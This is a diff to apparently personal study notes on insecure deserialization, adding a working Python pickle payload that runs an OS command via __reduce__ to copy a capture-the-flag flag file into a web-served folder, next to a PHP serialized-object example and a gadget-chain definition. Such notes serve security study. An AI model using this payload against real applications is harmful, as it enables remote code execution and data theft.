@@ -10,6 +10,23 @@ evalutes to true
 Serialized object example:
 `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`
 
+# #python #pickle
+#RCE:
+```python
+import pickle
+import base64
+import os
+
+class BlindRCE:
+    def __reduce__(self):
+        cmd = ('cp /app/flag.txt /app/application/static/flag.txt')
+        return os.system, (cmd, )
+
+i = BlindRCE()
+m = pickle.dumps(i)
+b = base64.b64encode(m).decode()
+print(b)
+```
 # Gadget chains
 A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. 
 
